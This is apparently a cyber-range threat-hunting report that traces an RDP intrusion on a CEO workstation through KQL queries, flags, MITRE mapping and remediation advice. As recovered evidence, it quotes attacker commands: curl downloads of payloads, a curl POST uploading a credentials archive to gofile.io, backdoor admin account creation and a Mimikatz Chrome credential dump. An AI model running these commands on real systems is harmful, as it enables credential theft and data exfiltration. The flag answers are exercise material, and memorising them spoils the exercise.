# Threat-Hunting-Scenario-Bridge-Takeover

## RDP Compromise Incident

**Report ID:** INC-2025-0612

**Analyst:** Nadezna Morris

**Date:** 16-December-2025

**Incident Date:** 24-November-2025

---

## Executive Summary

Five days after the initial file server breach, the threat actor returned and significantly escalated the intrusion — pivoting from the previously compromised workstation to the CEO's administrative PC, deploying a Meterpreter backdoor, creating a hidden admin account for persistence, and harvesting credential databases and browser passwords. The attacker staged sensitive financial data into **8 password-protected archives** and exfiltrated them, along with a credentials archive, to the anonymous file-sharing service **gofile.io**. This represents a critical escalation requiring immediate containment, credential resets, and a full forensic review.

---

## 1. Findings

### **Key Indicators of Compromise (IOCs):**

| Indicator                                                            | Description                  |
| -------------------------------------------------------------------- | -----------------------------|
| 10.1.0.204                                                           | Lateral movement source host |
| yuki.tanaka                                                          | Compromised account          |
| yuki.tanaka2                                                         | Rogue persistence account    |
| azuki-adminpc                                                        | Target host                  |
| litter.catbox.moe                                                    | C2 domain                    |
| 45.112.123.227                                                       | C2 / Exfil IP                |
| meterpreter.exe                                                      | Implant                      | 
| \Device\NamedPipe\msf-pipe-5902                                      | Named pipe (C2)              |
| C:\ProgramData\Microsoft\Crypto\staging                              | Staging directory            |
| credentials.tar.gz                                                   | Exfil archive (credentials)  |
| gofile.io (store1.gofile.io)                                         | Exfil destination            |
| m.exe (Mimikatz-based)                                               | Credential dumping tool      |
| OLD-Passwords.txt, KeePass-Master-Password.txt                       | Sensitive files accessed     |
| 7z.exe, curl.exe, robocopy.exe, qwinsta.exe, nltest.exe, netstat.exe | Tools abused                 |

---

***FLAG 1: LATERAL MOVEMENT - Source System***

**Objective:** Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.

**Flag:** `10.1.0.204`
```
DeviceLogonEvents
| where DeviceName has_any ("azuki")
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where LogonType == "RemoteInteractive"
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP
| order by TimeGenerated asc 
```
<img width="860" height="102" alt="image" src="https://github.com/user-attachments/assets/b6d8a128-ea5e-4dc9-ba1f-55539387bd3c" />

---

***FLAG 2: LATERAL MOVEMENT - Compromised Credentials***

**Objective:** Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities.

**Flag:** `yuki.tanaka`
```
DeviceLogonEvents
| where DeviceName has_any ("azuki")
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where LogonType == "RemoteInteractive"
| where RemoteIP == "10.1.0.204"
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP
| order by TimeGenerated asc
```
<img width="860" height="102" alt="image" src="https://github.com/user-attachments/assets/b6d8a128-ea5e-4dc9-ba1f-55539387bd3c" />

---

***FLAG 3: LATERAL MOVEMENT - Target Device***

**Objective:** Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.

**Flag:** `azuki-adminpc`
```
DeviceLogonEvents
| where DeviceName has_any ("azuki")
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where LogonType == "RemoteInteractive"
| where RemoteIP == "10.1.0.204"
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP
| order by TimeGenerated asc
```
<img width="860" height="102" alt="image" src="https://github.com/user-attachments/assets/b6d8a128-ea5e-4dc9-ba1f-55539387bd3c" />

---

***FLAG 4: EXECUTION - Payload Hosting Service***

**Objective:** Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.

**Flag:** `litter.catbox.moe`
```
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "ConnectionSuccess"
| where RemoteUrl != ""
| where not(RemoteUrl has_any ("microsoft", "windows", "office", "azure"))
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP
| order by TimeGenerated asc
```
<img width="620" height="75" alt="image" src="https://github.com/user-attachments/assets/98ac0e3d-fc66-42b4-aa4c-57ea3fec6015" />

---

***FLAG 5: EXECUTION - Malware Download Command***

**Objective:** Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

**Flag:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("curl", "wget", "bitsadmin", "certutil", "Invoke-WebRequest", "iwr")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1136" height="82" alt="image" src="https://github.com/user-attachments/assets/a6418d07-2191-4fb7-a03d-f943b4b3210e" />

---

***FLAG 6: EXECUTION - Archive Extraction Command***

**Objective:** Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

**Flag:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where FileName has_any ("7z.exe", "7za.exe", "winrar.exe", "rar.exe")
| where ProcessCommandLine has_any (" -p", "-p", "-pass", "-password")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1146" height="85" alt="image" src="https://github.com/user-attachments/assets/e95b41f2-c8e2-44d8-91ca-1f12def34503" />

---

***FLAG 7: PERSISTENCE - C2 Implant***

**Objective:** Command and control implants maintain persistent access and enable remote control of compromised systems. The implant filename often mimics legitimate processes.

**Flag:** `meterpreter.exe`
```
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "FileCreated"
| where FolderPath has_any ("AppData\\Local\\Temp", "Cache", "AppData\\Roaming")
| where FileName endswith ".exe"
| project TimeGenerated, DeviceName, FolderPath, FileName, InitiatingProcessFileName
| order by TimeGenerated asc
```
<img width="922" height="75" alt="image" src="https://github.com/user-attachments/assets/42db379f-7a4b-4171-a6c0-8191aaae4caa" />

---

***FLAG 8: PERSISTENCE - Named Pipe***

**Objective:** Named pipes enable inter-process communication for C2 frameworks. Pipes follow distinctive naming patterns that serve as behavioural indicators.

**Flag:** `\Device\NamedPipe\msf-pipe-5902`
```
DeviceEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "NamedPipeEvent"
| extend PipeName = tostring(parse_json(AdditionalFields).PipeName)
| where InitiatingProcessFileName == "meterpreter.exe"
| project TimeGenerated, DeviceName, PipeName, InitiatingProcessFileName
| order by TimeGenerated asc
```
<img width="782" height="75" alt="image" src="https://github.com/user-attachments/assets/3b411447-f2f7-46be-8be2-0231e1fdfb3f" />

---

***FLAG 9: CREDENTIAL ACCESS - Decoded Account Creation***

**Objective:** Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

**Flag:** `net user yuki.tanaka2 B@ckd00r2024! /add`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where FileName in ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-encodedcommand")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1202" height="82" alt="image" src="https://github.com/user-attachments/assets/7870f1c5-9619-4c4a-b303-aa8495e9455e" /> <br>

<img width="1520" height="277" alt="image" src="https://github.com/user-attachments/assets/b116600f-1b66-4914-8274-2f465d9e8743" />

----

***FLAG 10: PERSISTENCE - Backdoor Account***

**Objective:** Hidden administrator accounts provide alternative access if primary persistence mechanisms are discovered and removed.

**Flag:** `yuki.tanaka2`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where FileName in ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-encodedcommand")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1202" height="82" alt="image" src="https://github.com/user-attachments/assets/7870f1c5-9619-4c4a-b303-aa8495e9455e" /> <br>

<img width="1520" height="277" alt="image" src="https://github.com/user-attachments/assets/b116600f-1b66-4914-8274-2f465d9e8743" />

---

***FLAG 11: PERSISTENCE - Decoded Privilege Escalation Command***

**Objective:** Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

**Flag:** `net localgroup Administrators yuki.tanaka2 /add`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where FileName in ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-encodedcommand")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1101" height="75" alt="image" src="https://github.com/user-attachments/assets/f5f71a3b-e113-4458-8995-3cac711fe446" /> <br>

<img width="1522" height="281" alt="image" src="https://github.com/user-attachments/assets/617f6ed1-ed23-4c90-8770-39b806c37d8c" />

---

***FLAG 12: DISCOVERY - Session Enumeration***

**Objective:** Terminal services enumeration reveals active user sessions, helping attackers identify high-value targets and avoid detection.

**Flag:** `qwinsta.exe`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("query user", "quser", "qwinsta", "query session")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="662" height="75" alt="image" src="https://github.com/user-attachments/assets/01e9c2ea-96d8-43b5-b71c-e550543a75dc" />

---

***FLAG 13: DISCOVERY - Domain Trust Enumeration***

**Objective:** Domain trust relationships reveal paths for lateral movement across organisational boundaries and potential targets in connected forests.

**Flag:** `"nltest.exe" /domain_trusts /all_trusts`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("domain")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="727" height="97" alt="image" src="https://github.com/user-attachments/assets/9886a278-5ec1-40be-9bc5-d2e383cc0e44" />

---

***FLAG 14: DISCOVERY - Network Connection Enumeration***

**Objective:** Network connection enumeration identifies active sessions, listening services, and potential lateral movement targets.

**Flag:** `"NETSTAT.EXE" -ano`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("NET", "netstat")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="672" height="75" alt="image" src="https://github.com/user-attachments/assets/6e8e836a-8207-4f48-bdaf-74d514446a21" />

---

***FLAG 15: DISCOVERY - Password Database Search***

**Objective:** Password management databases contain credentials for multiple systems, making them high-priority targets for credential theft.

**Flag:** `"cmd.exe" /c where /r C:\Users *.kdbx`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("dir ", "where ", "Get-ChildItem", "gci")
| where ProcessCommandLine has_any (".kdbx", ".kdb", ".psafe3")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="751" height="74" alt="image" src="https://github.com/user-attachments/assets/d5abf2d1-b7f6-4964-8418-f11b76cdbacf" />

---

***FLAG 16: DISCOVERY - Credential File***

**Objective:** Plaintext password files represent critical security failures and provide attackers with immediate access to multiple systems.

**Flag:** `OLD-Passwords.txt`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any (".txt")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc 
```
<img width="836" height="72" alt="image" src="https://github.com/user-attachments/assets/d34846a5-00ba-4b87-aa39-c5efeb22d64e" />

---

***FLAG 17: COLLECTION - Data Staging Directory***

**Objective:** Attackers establish staging locations in system directories to organise stolen data before exfiltration. These paths are critical IOCs for forensic investigation.

**Flag:** `C:\ProgramData\Microsoft\Crypto\staging`
```
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "FileCreated"
| where FolderPath has_any ("staging")
| project TimeGenerated, DeviceName, ActionType, FolderPath
| order by TimeGenerated desc 
```
<img width="866" height="98" alt="image" src="https://github.com/user-attachments/assets/8cf3fe29-1454-42a9-b87b-ff02ab6569ce" />

---

***FLAG 18: COLLECTION - Automated Data Collection Command***

**Objective:** Scriptable file copying technique with retry logic and network optimisation is ideal for bulk data theft operations

**Flag:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("/R:", "/W:", "/Z", "/E")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc 
```
<img width="1048" height="72" alt="image" src="https://github.com/user-attachments/assets/92c60910-a029-457a-ba0e-7d44f2098c48" />

---

***FLAG 19: COLLECTION - Exfiltration Volume***

**Objective:** Quantifying the number of archives created reveals the scope of data theft and helps prioritise impact assessment efforts.

**Flag:** `8`
```
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "FileCreated"
| where InitiatingProcessFileName has_any ("7z.exe", "rar.exe", "WinRAR.exe", "tar.exe", "zip.exe")
| where FileName !has "PSScriptPolicyTest_"
| project TimeGenerated, DeviceName, ActionType, FolderPath
| order by TimeGenerated desc
```
<img width="820" height="276" alt="image" src="https://github.com/user-attachments/assets/a5334b95-64e6-49d8-8b7a-2a28f9a05189" />

---

***FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download***

**Objective:** Attackers download specialised credential theft tools directly to compromised systems, adapting their toolkit to the target environment.

**Flag:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("curl", "wget", "certutil", "bitsadmin", "Invoke-WebRequest", "iwr")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated desc
```
<img width="821" height="72" alt="image" src="https://github.com/user-attachments/assets/57515e47-17cd-4400-8e06-86c9b799fb79" />

---

***FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft***

**Objective:** Modern credential theft targets browser password stores, extracting saved credentials without triggering LSASS-focused detections.

**Flag:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("mimikatz", "browser", "chrome", "edge", "logins", "theft")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated desc
```
<img width="1162" height="82" alt="image" src="https://github.com/user-attachments/assets/79418f3a-1b8b-4d05-a07c-ecb17d68375e" />

---

***FLAG 22: EXFILTRATION - Data Upload Command***

**Objective:** Form-based HTTP uploads provide simple, reliable data exfiltration that blends with legitimate web traffic and supports large file transfers.

**Flag:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("curl", "Invoke-WebRequest", "iwr", "wget")
| where ProcessCommandLine has_any ("POST", "-F", "--form", "-X POST", "-Method Post")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated desc
```
<img width="992" height="72" alt="image" src="https://github.com/user-attachments/assets/7fcda01a-f0f0-4088-bcf5-a6648a655f65" />

---

***FLAG 23: EXFILTRATION - Cloud Storage Service***

**Objective:** Anonymous file sharing services provide temporary storage with self-destructing links, complicating data recovery and attribution.

**Flag:** `gofile.io`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any ("credentials.tar.gz")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated desc
```
<img width="992" height="72" alt="image" src="https://github.com/user-attachments/assets/7fcda01a-f0f0-4088-bcf5-a6648a655f65" />

---

***FLAG 24: EXFILTRATION - Destination Server***

**Objective:** IP addresses enable network-layer blocking and threat intelligence correlation when domain-based controls fail or are bypassed.

**Flag:** `45.112.123.227`
```
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ActionType == "ConnectionSuccess"
| where RemoteUrl has_any ("gofile")
| project TimeGenerated, DeviceName, RemoteIP, RemoteUrl
| order by TimeGenerated asc
```
<img width="566" height="72" alt="image" src="https://github.com/user-attachments/assets/fba96cdd-c7b9-4104-b98e-d7541f75687c" />

---

***FLAG 25: CREDENTIAL ACCESS - Master Password Extraction***

**Objective:** Password managers store credentials for multiple systems. Extracting the master password provides access to all stored secrets.

**Flag:** `KeePass-Master-Password.txt`
```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-14))
| where ProcessCommandLine has_any (".txt")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="952" height="72" alt="image" src="https://github.com/user-attachments/assets/dc0bf0ab-ef21-4dc1-9fe8-c2b0663bbd6e" />

---

## 2. Investigation Summary

Five days after the initial file server compromise, the threat actor returned to the environment and escalated the intrusion significantly. Using the previously compromised account, `yuki.tanaka`, the attacker pivoted laterally from host `10.1.0.204` to `azuki-adminpc`, the CEO's administrative workstation — a high-value target with access to sensitive financial and credential data.  
On the new target, the attacker deployed a **Meterpreter** implant (disguised as `meterpreter.exe`) communicating over a named pipe (`msf-pipe-5902`), establishing persistent command-and-control. To maintain access even if discovered, they created a hidden local administrator account, `yuki.tanaka2`, via base64-obfuscated commands.  
The attacker then conducted extensive **reconnaissance** (active session, domain trust, and network enumeration via `qwinsta`, `nltest`, and `netstat`) before locating and harvesting credential stores, including a KeePass database (`OLD-Passwords.txt`, `KeePass-Master-Password.txt`) and Chrome-stored browser credentials extracted using a Mimikatz-based tool (`m.exe`).  
Sensitive files — including banking records — were staged via `Robocopy` into `C:\ProgramData\Microsoft\Crypto\staging`, where **8 password-protected archives** were prepared using 7-Zip for exfiltration. Stolen data, including `credentials.tar.gz`, was exfiltrated via HTTP POST to the anonymous file-sharing service `gofile.io` (store1.gofile.io), with supporting infrastructure tied to IP `45.112.123.227` and a secondary download from the previously identified C2 domain `litter.catbox.moe`.  
This second-stage intrusion represents a significant escalation: from initial workstation compromise to CEO-level access, persistent backdoor deployment, credential database theft, and confirmed exfiltration of financial and authentication data — warranting immediate credential resets, IOC blocking, and full forensic review of the affected systems.

---

## 3. MITRE ATT&CK Mapping

| Tactic                              | Technique                                                 | Evidence                                         |
| ----------------------------------- | --------------------------------------------------------- | ------------------------------------------------ |
| Initial Access / Lateral Movement   | T1078 - Valid Accounts                                    | Use of yuki.tanaka credentials                   |
| Lateral Movement                    | T1021 - Remote Services                                   | Pivot from 10.1.0.204 to azuki-adminpc           |
| Execution                           | T1059 - Command and Scripting Interpreter                 | Base64-encoded cmd/PowerShell commands           |
| Defense Evasion                     | T1140 - Deobfuscate/Decode Files or Information           | Base64-encoded account creation commands         |
| Persistence                         | T1136.001 - Create Account: Local Account                 | Creation of yuki.tanaka2                         | 
| Privilege Escalation                | T1098 - Account Manipulation (Add to Admin Group)         | yuki.tanaka2 added to Administrators             |
| Command and Control                 | T1071 / T1559 - Application Layer Protocol / IPC          | Meterpreter named pipe msf-pipe-5902             |
| Command and Control / Resource Dev. | T1105 - Ingress Tool Transfer                             | curl.exe downloads from litter.catbox.moe        |
| Discovery                           | T1087 - Account Discovery                                 | qwinsta.exe session enumeration                  |
| Discovery                           | T1482 - Domain Trust Discovery                            | nltest.exe /domain_trusts                        |
| Discovery                           | T1049 - System Network Connections Discovery              | netstat.exe -ano                                 |
| Discovery                           | T1083 - File and Directory Discovery                      | where /r search for .kdbx files                  |
| Credential Access                   | T1555 - Credentials from Password Stores                  | KeePass database, OLD-Passwords.txt              |
| Credential Access                   | T1003.001 - OS Credential Dumping (DPAPI)                 | m.exe Chrome DPAPI credential extraction         |
| Collection                          | T1074.001 - Data Staged                                   | Robocopy to staging directory                    |
| Collection                          | T1560.001 - Archive Collected Data                        | 7z.exe creation of 8 password-protected archives |
| Exfiltration                        | T1567.002 - Exfiltration Over Web Service (Cloud Storage) | curl POST to gofile.io                           |

---

## 4. Recommendations

### Immediate Action

- Isolate `azuki-adminpc` and `10.1.0.204` from the network for forensic imaging and analysis.
- Force password resets for `yuki.tanaka` and all accounts with browser-saved or KeePass-stored credentials (assume full compromise).
- Identify and disable/delete the rogue `yuki.tanaka2` account; audit all local admin group memberships across the environment.
- Block C2/exfil infrastructure at firewall/proxy: `litter.catbox.moe, gofile.io` / `store1.gofile.io`, and `45.112.123.227`.
- Kill any running `meterpreter.exe` processes and hunt for the `msf-pipe-5902` named pipe pattern on other hosts.
- Preserve volatile evidence (memory, network connections, process list) before remediation actions.

### Short-term Remediation

- Conduct environment-wide IOC and TTP sweep (same archive tool usage, curl downloads, staging directories, named pipe patterns) on all hosts, especially admin workstations.
- Rotate all credentials stored in the compromised KeePass database and review for reuse across systems.
- Restrict/whitelist execution of compression and download utilities (7z.exe, curl.exe, robocopy.exe) from non-administrative contexts.
- Enable enhanced logging: process creation with command-line auditing, PowerShell script block logging, and named pipe creation events.
- Restrict or monitor outbound traffic to anonymous file-sharing/storage services (gofile.io, catbox.moe, and similar).
- Re-image affected endpoints (azuki-adminpc, originally compromised file server, 10.1.0.204) rather than relying on cleanup alone.

### Long-term Remediation

- Deploy/strengthen EDR with behavioral detections for archive-then-exfil patterns, suspicious named pipes, and DPAPI credential access.
- Implement a Privileged Access Management (PAM) solution; remove standing local admin rights, especially on executive/admin workstations.
- Enforce network segmentation isolating high-value endpoints (executive PCs, file servers) from general user segments.
- Mandate MFA for all privileged accounts and migrate away from plaintext credential files toward enterprise password management with audit trails.
- Deploy DLP controls to detect bulk staging and outbound transfers of compressed/archived data.
- Integrate threat intelligence feeds to proactively block known infrastructure (e.g., catbox.moe, gofile.io patterns) where business need doesn't require access.
- Conduct regular purple-team exercises to validate detection coverage for lateral movement, persistence, and exfiltration TTPs identified in this incident.

---

**Report Status:** Complete  

**Next Review:** 23rd December 2025

**Distribution:** Cyber Range
